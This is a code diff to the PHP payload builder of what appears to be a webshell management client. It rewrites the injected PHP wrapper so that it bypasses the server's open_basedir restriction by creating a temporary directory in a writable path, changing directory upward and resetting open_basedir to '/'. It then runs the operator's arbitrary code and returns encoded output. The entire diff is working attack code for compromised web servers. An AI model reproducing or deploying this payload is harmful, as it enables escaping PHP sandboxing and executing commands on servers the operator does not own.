@@ -89,7 +89,33 @@ class PHP extends Base {
     // @chdir('.');@ini_set('open_basedir','..');for($i=0;$i<10;$i++){@chdir('..');}@ini_set('open_basedir','/');
     let tmpCode = data['_'];
     let opdir = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5));
-    data['_'] = `@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$oparr=preg_split("/\\\\\\\\|\\//",$opdir);$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$tmdir=".${opdir}";@mkdir($tmdir);@chdir($tmdir);@ini_set("open_basedir","..");for($i=0;$i<sizeof($oparr);$i++){@chdir("..");}@ini_set("open_basedir","/");@rmdir($ocwd."/".$tmdir);};${asencCode};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "${tag_s.substr(0,tag_s.length/2)}"."${tag_s.substr(tag_s.length/2)}";echo @asenc($output);echo "${tag_e.substr(0,tag_e.length/2)}"."${tag_e.substr(tag_e.length/2)}";}ob_start();try{${tmpCode};}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();`;
+    let bypassOpenBaseDirCode = `
+    $opdir=@ini_get("open_basedir");
+    if($opdir) {
+        $ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);
+        $oparr=preg_split("/;|:/",$opdir);
+        @array_push($oparr,$ocwd,sys_get_temp_dir());
+        foreach($oparr as $item) {
+            if(!@is_writable($item)){
+                continue;
+            };
+            $tmdir=$item."/.${opdir}";
+            @mkdir($tmdir);
+            if(!@file_exists($tmdir)){
+                continue;
+            }
+            @chdir($tmdir);
+            @ini_set("open_basedir", "..");
+            $cntarr=@preg_split("/\\\\\\\\|\\//",$tmdir);
+            for($i=0;$i<sizeof($cntarr);$i++){
+                @chdir("..");
+            };
+            @ini_set("open_basedir","/");
+            @rmdir($tmdir);
+            break;
+        };
+    };`.replace(/\n\s+/g, '');
+    data['_'] = `@ini_set("display_errors", "0");@set_time_limit(0);${bypassOpenBaseDirCode};${asencCode};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "${tag_s.substr(0,tag_s.length/2)}"."${tag_s.substr(tag_s.length/2)}";echo @asenc($output);echo "${tag_e.substr(0,tag_e.length/2)}"."${tag_e.substr(tag_e.length/2)}";}ob_start();try{${tmpCode};}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();`;
 
     // 使用编码器进行处理并返回
     return this.encodeComplete(tag_s, tag_e, data);
